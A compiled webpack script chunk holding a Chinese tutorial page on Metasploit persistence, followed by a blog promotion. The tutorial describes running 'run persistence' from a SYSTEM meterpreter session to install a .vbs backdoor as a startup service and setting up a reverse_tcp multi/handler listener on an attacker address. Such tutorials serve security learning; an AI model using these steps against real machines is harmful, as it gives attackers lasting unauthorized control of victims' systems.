(window.webpackJsonp=window.webpackJsonp||[]).push([[265],{555:function(s,e,t){"use strict";t.r(e);var a=t(7),r=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"metasploit访问控制的持久化"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit访问控制的持久化"}},[s._v("#")]),s._v(" Metasploit访问控制的持久化")]),s._v(" "),e("p",[s._v("工具：Metasploit")]),s._v(" "),e("p",[s._v("为了实现这一点，可以选择在目标计算机上添加一个新的用户，也可以选择使用MSF中persistence模块。")]),s._v(" "),e("p",[s._v("运行persistence模块可以通过在目标计算机上安装一个永久性的后门来实现访问控制的持久化。这样，即使有一天目标计算机修补了漏洞，我们仍然可以通过这个连接来实现对目标计算机的控制。")]),s._v(" "),e("p",[s._v("这里，我们假设经过了一系列的渗透拿到了system权限的meterpreter，我们在meterpreter命令行执行如下命令：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("run persistence\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("运行persistence模块会向目标计算机上传一个.vbs类型的恶意脚本文件，并在目标计算机上执行这个恶意脚本文件。这个脚本一旦在目标计算机上运行，每隔几秒钟就会主动连接攻击者的计算机。这个恶意脚本文件会被当做一个系统服务安装在目标计算机系统中，同时，会被添加到开机启动项中，因此，无论目标计算机重启多少次，该恶意服务都可以运行。除非卸载该服务或手动删除文件，否则恶意服务一直存在。")]),s._v(" "),e("p",[s._v("这里，我们重新开启一个MSF来验证：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("此处需要注意的是：我们设置攻击载荷和LPORT选项必须与运行persistence模块时设置的攻击载荷和LPORT选项相同。")]),s._v(" "),e("p",[s._v("发出攻击命令exploit后，exploit/multi/handler开始等待从目标系统上发回来的连接。一旦传入的连接被检测到，控制端就会切换到Meterpreter命令行。")]),s._v(" "),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=r.exports}}]);